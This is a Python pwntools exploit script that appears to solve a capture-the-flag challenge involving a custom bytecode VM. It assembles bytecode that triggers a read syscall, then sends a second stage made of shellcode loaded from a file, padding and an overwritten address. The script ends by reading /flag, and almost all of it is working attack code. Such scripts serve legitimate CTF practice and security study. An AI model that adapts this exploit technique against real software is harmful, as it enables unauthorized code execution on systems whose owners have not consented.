#!/usr/bin/python3
from pwn import *
from sys import exit

context.binary = binary = ELF("", checksec=False)
context.log_level = "critical"
bp = ""
pack = make_packer("all")

_gdb='''
set disassembly-flavor intel
#break read
break sleep
c
display/8i $rip
display/x $rbp
display/22g $rsp+0x400
'''

'''
80 = mov
10 = add
01 = stack
40 = store
08 = load
40 = cmp
20 = jmp
02 = sys

regs:
    0x405 rip = 0x04
    0x406 rsp = 0x01
    0x400   a = 0x10
    0x401   b = 0x02
    0x402   c = 0x40
    0x403   d = 0x08
    0x404   f = 0x20
'''

#[value][register][op]

def load_shellcode():
    with open("asm/chmodtext", "rb") as f:
        shellcode = bytes(f.read())
        f.close()
        return shellcode

def _compile():
    shellcode = ""
    shellcode += "100080" # mov a = 00
    shellcode += "02d080" # mov b = d0
    shellcode += "40ff80" # mov c = ff
    shellcode += "100802" # syscall read
    return bytes.fromhex(shellcode)
   
def stage2():
    shellcode = load_shellcode()
    shellcode += bytes.fromhex("41" * 48)
    shellcode += pack(0xffffe200)
    return shellcode

def runner():
    p = process()
    #p = gdb.debug(bp, gdbscript=_gdb, terminal=["tmux", "splitw", "-h"])
    code = _compile()
    p.recv()
    p.send(code)
    print(p.recv().decode())
    p.send(stage2())
    print(p.recv().decode())
    #p.close()

if __name__ == '__main__':
    runner()
    try:
        with open("/flag", "r") as f:
            print(f.read())
            f.close()
    except:
        print("[!] Failed :(")
